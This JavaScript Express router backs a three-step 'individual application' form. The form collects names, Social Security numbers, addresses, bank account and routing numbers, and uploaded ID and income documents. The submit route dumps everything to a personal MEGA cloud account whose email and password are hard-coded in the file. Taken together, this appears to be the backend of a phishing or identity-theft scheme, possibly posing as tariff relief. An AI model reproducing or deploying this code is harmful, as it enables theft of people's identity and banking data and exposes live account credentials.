const express = require('express');
const fileUpload = require('express-fileupload');
const mega = require('megajs');
const { Readable } = require('stream'); // Import Readable stream
const router = express.Router();

const validateEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
const validateSSN = (ssn) => /^\d{3}-\d{2}-\d{4}$/.test(ssn);
const validateZIP = (zip) => /^\d{5}(-\d{4})?$/.test(zip);
const validateAccountNumber = (accountNumber) => /^\d{10,12}$/.test(accountNumber);
const validateRoutingNumber = (routingNumber) => /^\d{9}$/.test(routingNumber);

// Enable file upload middleware
router.use(fileUpload());

// MEGA storage configuration
const megaStorage = new mega.Storage({
    email: 'guirez1921@gmail.com',
    password: '44bCfCEEsxH3_xF'
});

router.post('/verify', async (req, res) => {
    try {
        const { step } = req.body;
        const data = req.body;
        const files = req.files || {};

        if (!step || !data) {
            return res.status(200).json({ success: false, message: 'Invalid request data' });
        }

        const errors = {};

        switch (parseInt(step, 10)) {
            case 1:
                // Validate Personal Information
                if (!data.firstName) errors.firstName = 'FirstName is required';
                if (!data.lastName) errors.lastName = 'Last name is required';
                if (!data.ssn) {
                    errors.ssn = 'SSN is required';
                } else if (!validateSSN(data.ssn)) {
                    errors.ssn = 'SSN is in an invalid format';
                }
                if (!data.address) errors.address = 'Address is required';
                if (!data.city) errors.city = 'City is required';
                if (!data.state) errors.state = 'State is required';
                if (!data.zip) {
                    errors.zip = 'ZIP code is required';
                } else if (!validateZIP(data.zip)) {
                    errors.zip = 'ZIP code is in an invalid format';
                }
                if (!data.phone) errors.phone = 'Phone number is required';
                if (!data.email) {
                    errors.email = 'Email is required';
                } else if (!validateEmail(data.email)) {
                    errors.email = 'Email is in an invalid format';
                }
                break;
            case 2:
                // Validate Financial Details
                if (!data.annualIncome) errors.annualIncome = 'Annual income is required';
                if (!data.assets) errors.assets = 'Assets are required';
                if (!data.liabilities) errors.liabilities = 'Liabilities are required';
                if (!data.bankName) errors.bankName = 'Bank name is required';
                if (!data.accountNumber) {
                    errors.accountNumber = 'Account number is required'
                } else if (!validateAccountNumber(data.accountNumber)) {
                    errors.accountNumber = 'Account number has an invalid format';
                }
                if (!data.routingNumber) {
                    errors.routingNumber = 'Routing number is required';
                } else if (!validateRoutingNumber(data.routingNumber)) {
                    errors.routingNumber = 'Routing number has an invalid format';
                }
                if (!data.accountType) errors.accountType = 'Account type is required';
                break;
            case 3:
                // Validate Documentation
                const requiredFiles = ['idProof', 'incomeProof', 'tariffImpactProof'];
                const allowedExtensions = ['.pdf', '.jpg', '.jpeg', '.png'];
                for (const fileKey of requiredFiles) {
                    if (!files[fileKey]) {
                        errors[fileKey] = `${fileKey} is required`;
                    } else if (!files[fileKey].name || !allowedExtensions.some(ext => files[fileKey].name.toLowerCase().endsWith(ext))) {
                        errors[fileKey] = `${fileKey} must be a PDF or an image file (jpg, jpeg, png)`;
                    }
                }
                break;
            default:
                return res.status(200).json({ success: false, message: 'Invalid step' });
        }

        if (Object.keys(errors).length > 0) {
            return res.status(200).json({ success: false, message: 'Validation errors', errors });
        }

        res.json({ success: true, message: 'Individual application step validated successfully' });
    } catch (error) {
        console.error('Error during verification:', error);
        res.status(500).json({ success: false, message: 'An error occurred during verification' });
    }
});

router.post('/submit', async (req, res) => {
    try {
        const data = req.body;
        const files = req.files || {};

        // Convert data to JSON string
        const jsonData = JSON.stringify({ ...data, files: Object.keys(files) });

        // Create a readable stream from the JSON string
        const jsonStream = Readable.from(jsonData);

        // Upload JSON file to MEGA
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const fileName = `individual_application_${timestamp}.json`;
        const megaFile = megaStorage.upload({ name: fileName });
        jsonStream.pipe(megaFile);

        await new Promise((resolve, reject) => {
            megaFile.on('complete', resolve);
            megaFile.on('error', reject);
        });

        res.json({ success: true, message: 'Individual application submitted and saved to MEGA successfully' });
    } catch (error) {
        console.error('Error during submission:', error);
        res.status(500).json({ success: false, message: 'An error occurred during submission' });
    }
});

module.exports = router;
